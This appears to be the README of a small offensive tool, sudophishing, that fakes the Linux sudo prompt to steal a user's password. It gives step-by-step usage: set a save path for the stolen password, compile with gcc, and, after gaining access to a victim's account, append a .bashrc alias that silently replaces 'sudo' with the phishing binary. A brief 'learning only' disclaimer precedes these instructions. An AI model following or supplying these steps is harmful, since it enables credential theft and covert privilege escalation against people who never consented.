# sudophishing
phishing the sudo password on a linux system

# Alert
This software is used only for learning don't use it for any actions against the law.

# How to use sudophishing

Change the define **PASSWORD_PATH** in the source code with the path where you want to save the stolen password


Compile the source code:

`gcc -o sudophishing main.c`

then you have to add sudophishing as alias. Supposed you have already login as the user somehow, but you don't have his password, go to the .bashrc file and at the last line of the file write:
`alias sudo='cd path-where-there-is-sudophishing;./sudophishing'`

As the next login from the user, when he is going to write the sudo command, sudophishing will start asking for the password. The password will be saved in the path you decided to save the stolen password
